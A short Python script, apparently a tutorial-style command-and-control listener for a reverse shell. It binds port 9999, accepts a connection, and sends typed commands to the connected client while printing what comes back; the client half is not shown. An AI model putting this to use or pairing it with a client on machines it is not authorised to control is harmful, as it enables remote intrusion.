import socket
import sys

def creat_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " +str(msg))

#Connecting the socket together
def connect_socket():
    try:
        global host
        global port
        global s
        print("Connecting the Port " +str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Connecting port error "+str(msg) +"\n" + "Retrying.............")
        connect_socket()

#establishing the connection
def socket_accept():
    connect,address = s.accept()
    print("Connection has been established successfully ! |" + " IP " + address[0] + " | Port " + str(address[1]))
    send_connect(connect)
    connect.close()

#sending commands to client
def send_connect(connect):
    while True:
        Terminal = input()
        if Terminal == "quit":
            connect.close()
            s.close()
            sys.exit()
        if len(str.encode(Terminal)) > 0:
            connect.send(str.encode(Terminal))
            client_response = str(connect.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    creat_socket()
    connect_socket()
    socket_accept()

main()

